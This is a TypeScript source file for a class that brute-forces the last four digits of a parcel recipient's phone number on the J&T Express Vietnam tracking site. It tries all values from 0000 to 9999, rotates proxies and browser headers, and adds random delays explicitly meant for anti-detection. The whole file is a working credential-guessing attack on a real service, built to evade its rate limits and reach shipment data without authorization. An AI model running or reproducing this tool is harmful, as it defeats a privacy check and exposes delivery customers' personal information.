import axios, { AxiosInstance } from "axios";
import { HttpProxyAgent } from 'http-proxy-agent';
import { HttpsProxyAgent } from 'https-proxy-agent';
import { proxyManager } from "../proxy";
import { SCAN_PHONE_JOB_EVENT, scanPhoneJobManager } from "./scanPhoneJobManager";

interface AxiosRequestConfig {
  params?: {
    type: string;
    billcode: string;
    cellphone: string;
  };
  timeout?: number;
  validateStatus?: () => boolean;
  headers?: Record<string, string>;
  httpAgent?: HttpProxyAgent;
  httpsAgent?: HttpsProxyAgent;
}

export class PhoneBruteForceFinder {
  private baseUrl: string = 'https://jtexpress.vn/vi/tracking';
  private currentProxyIndex: number;
  private attemptCount: number;
  private userAgents: string[];
  private languages: string[];
  private headers: Record<string, string>;
  private client: AxiosInstance;
  private abortSignal?: AbortSignal;
  private maxRetries: number = 2;
  private retryDelay: number = 1000; // ms

  constructor(initialAttemptCount: number = 0, abortSignal?: AbortSignal) {
    this.currentProxyIndex = 0;
    this.attemptCount = initialAttemptCount;
    this.abortSignal = abortSignal;

    // User-Agent rotation list
    this.userAgents = [
      'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36',
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36',
      'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36',
      'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36'
    ];

    // Accept-Language rotation
    this.languages = [
      'en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,vi;q=0.6',
      'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
      'th-TH,th;q=0.9,en-US;q=0.8,en;q=0.7',
      'en-US,en;q=0.9,vi;q=0.8,zh-CN;q=0.7'
    ];

    this.headers = {
      'Accept': '*/*',
      'Accept-Language': this.getRandomLanguage(),
      'Cache-Control': 'no-cache',
      'Connection': 'keep-alive',
      'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
      'Origin': 'https://jtexpress.vn',
      'Pragma': 'no-cache',
      'Sec-Fetch-Dest': 'empty',
      'Sec-Fetch-Mode': 'cors',
      'Sec-Fetch-Site': 'same-origin',
      'User-Agent': this.getRandomUserAgent(),
      'X-OCTOBER-REQUEST-HANDLER': 'onSearchPriceList',
      'X-OCTOBER-REQUEST-PARTIALS': 'search/pricelist/result-list-search',
      'X-Requested-With': 'XMLHttpRequest',
      'sec-ch-ua': '"Chromium";v="146", "Not-A.Brand";v="24", "Google Chrome";v="146"',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': this.getRandomPlatform()
    };

    this.client = axios.create({
      headers: this.headers,
      timeout: 10000,
      validateStatus: () => true
    });
  }

  /**
   * Get random User-Agent
   */
  getRandomUserAgent(): string {
    return this.userAgents[Math.floor(Math.random() * this.userAgents.length)];
  }

  /**
   * Get random Accept-Language
   */
  getRandomLanguage(): string {
    return this.languages[Math.floor(Math.random() * this.languages.length)];
  }

  /**
   * Get random platform
   */
  getRandomPlatform(): string {
    const platforms = ['"macOS"', '"Windows"', '"Linux"'];
    return platforms[Math.floor(Math.random() * platforms.length)];
  }

  /**
   * Get random delay with fixed range (2000-3000ms for anti-detection)
   * @returns {number} Random delay between 2000-3000ms
   */
  getRandomDelay(): number {
    const min = 2000;
    const max = 3000;
    return Math.floor(Math.random() * (max - min) + min);
  }
  /**
   * Get next proxy in rotation
   * @returns {Object|null} Proxy config or null if no proxies
   */
  getNextProxy() {
    const proxies = proxyManager.getAllProxies();

    const proxy = proxies[this.currentProxyIndex];
    this.currentProxyIndex = (this.currentProxyIndex + 1) % proxies.length;

    // Parse proxy URL (format: http://ip:port)
    const url = new URL(proxy.server);

    return {
      protocol: url.protocol.replace(':', ''),
      hostname: url.hostname,
      port: Number.parseInt(url.port, 10),
      auth: {
        username: proxy.username || '',
        password: proxy.password || ''
      }
    };
  }

  /**
   * Make HTTP request with retry logic for connection errors
   */
  private async makeRequestWithRetry(billcode: string, cellphone: string, proxy: any): Promise<any> {
    let lastError: any = null;

    for (let attempt = 0; attempt <= this.maxRetries; attempt++) {
      try {
        const requestConfig: AxiosRequestConfig = {
          params: { type: 'track', billcode, cellphone },
          timeout: 20000 + (attempt * 5000),
          validateStatus: () => true,
          headers: {
            'User-Agent': this.getRandomUserAgent(),
            'Accept-Language': this.getRandomLanguage(),
            'sec-ch-ua-platform': this.getRandomPlatform()
          }
        };

        if (proxy) {
          const proxyUrl = `http://${proxy.auth.username}:${proxy.auth.password}@${proxy.hostname}:${proxy.port}`;
          requestConfig.httpAgent = new HttpProxyAgent(proxyUrl);
          requestConfig.httpsAgent = new HttpsProxyAgent(proxyUrl);
        }

        return await this.client.get(this.baseUrl, requestConfig);
      } catch (error: any) {
        lastError = error;
        const isRetryable = ['ECONNABORTED', 'ETIMEDOUT', 'ECONNRESET', 'EHOSTUNREACH'].includes(error.code);

        if (attempt < this.maxRetries && isRetryable) {
          const delay = this.retryDelay * Math.pow(2, attempt);
          console.log(`   ⚠️  ${cellphone} - Retry ${attempt + 1}/${this.maxRetries} (${error.code}, waiting ${delay}ms)`);
          await new Promise(resolve => setTimeout(resolve, delay));
        } else {
          throw error;
        }
      }
    }

    throw lastError;
  }

  /**
   * Check if a phone number is valid for a tracking code
   * by making a request to the API with retry logic
   * @param {string} billcode - Tracking number
   * @param {string} cellphone - Last 4 digits
   * @returns {Promise<Object>} Response details
   */
  async checkPhoneValidity(billcode: string, cellphone: string): Promise<{
    status: number | string;
    isValid: boolean;
    error?: string;
  }> {
    try {
      const proxy = this.getNextProxy();
      const response = await this.makeRequestWithRetry(billcode, cellphone, proxy);

      const hasError = JSON.stringify(response.data)?.includes('Không tìm thấy dữ liệu về vận đơn');

      if (!hasError && response.status === 200) {
        console.log(`   ✅ ${cellphone} - Valid`);
        return { status: 'success', isValid: true };
      }

      return { status: 'error', isValid: !hasError && response.status === 200 };
    } catch (error: any) {
      const errorMessage = error instanceof Error ? error.message : String(error);
      const errorCode = error.code || 'UNKNOWN';
      console.log(`   ❌ ${cellphone} - Failed: ${errorCode}`);
      return { status: 'error', isValid: false, error: errorMessage };
    }
  }

  /**
   * Check validity of provided phone numbers
   * @param billcode - Tracking code
   * @param phones - List of phone numbers to check
   * @returns First valid phone number found or null
   */
  private async checkProvidedPhones(billcode: string, phones: string[]): Promise<string | null> {

    for (const phone of phones) {
      // Check for abort signal
      this.checkAbort('provided phones check');

      const lastFourDigits = String(phone).padStart(4, '0');
      const result = await this.checkPhoneValidity(billcode, lastFourDigits);

      if (result.isValid) {
        return lastFourDigits
      }

      await new Promise(resolve => setTimeout(resolve, this.getRandomDelay()));
    }

    return null;
  }

  /**
   * Brute force search for valid phone numbers
   * @param billcode - Tracking code
   * @param startFrom - Starting number for brute force
   * @param maxAttempts - Maximum attempts to try
   * @returns First valid phone number found or null
   */
  private async bruteForcePhones({ billcode, startFrom, maxAttempts, jobId }: { billcode: string; startFrom: number; maxAttempts: number; jobId: string }): Promise<string | null> {
    // Update progress callback immediately at start
    scanPhoneJobManager.emit(SCAN_PHONE_JOB_EVENT.UPDATE_ATTEMPT, jobId, this.attemptCount);

    for (let i = startFrom; i < maxAttempts; i++) {
      // Check for abort signal
      this.checkAbort('phone validation');

      const lastFourDigits = String(i).padStart(4, '0');
      const result = await this.checkPhoneValidity(billcode, lastFourDigits);

      if (result.isValid) {
        return lastFourDigits;
      }

      this.attemptCount++;
      await this.logBruteForceProgress(jobId);

      await new Promise(resolve => setTimeout(resolve, this.getRandomDelay()));
    }

    return null;
  }

  /**
   * Log progress during brute force search
   * Also calls progress callback to update database in real-time
   */
  private async logBruteForceProgress(jobId: string): Promise<void> {
    // Update every 20 attempts for more real-time feedback
    if (this.attemptCount % 20 === 0) {
      console.log(`   ⏱️  Attempted ${this.attemptCount} combinations...`);

      // Emit event to update attempt count in database
      scanPhoneJobManager.emit(SCAN_PHONE_JOB_EVENT.UPDATE_ATTEMPT, jobId, this.attemptCount);
    }
  }

  /**
   * Log results of phone search
   */
  private logSearchResults(billcode: string, validPhone: string | null): void {
    if (validPhone) {
      console.log(`✅ Valid phone for ${billcode}: ${validPhone}`);
    }
  }

  /**
   * Check if the job has been aborted and should stop
   */
  private checkAbort(context: string = 'brute force'): void {
    if (this.abortSignal?.aborted) {
      console.log(`🛑 [SCAN PHONE] Abort signal received during ${context}, stopping job...`);
      throw new Error('JOB_ABORTED');
    }
  }

  /**
    * Main function to find valid phone numbers for a given tracking code
    * @returns {Promise<Object>} Result with valid phones and attempt count
   */
  async findPhone(
    {
      billcode,
      phones,
      startFrom,
      maxAttempts = 9999,
      jobId
    }: {
      billcode: string;
      phones: string[];
      startFrom: number;
      maxAttempts?: number;
      jobId: string;
    }
  ): Promise<{
    status: string;
    billcode: string;
    validPhones: string;
    attemptCount: number;
  }> {
    let validPhone: string | null = null;

    if (startFrom === 0) {
      console.log(`🔍 Starting phone scan for billcode: ${billcode} with provided phones...`);
      validPhone = await this.checkProvidedPhones(billcode, phones);
      
      if (!validPhone) {
        console.log(`   🔍 No valid phones found in provided list, starting brute-force search...`);
        validPhone = await this.bruteForcePhones({ billcode, startFrom, maxAttempts, jobId });
      }
    } else {
      validPhone = await this.bruteForcePhones({ billcode, startFrom, maxAttempts, jobId });
    }

    this.logSearchResults(billcode, validPhone);

    return {
      status: 'success',
      billcode: billcode,
      validPhones: validPhone || '',
      attemptCount: this.attemptCount
    };
  }
}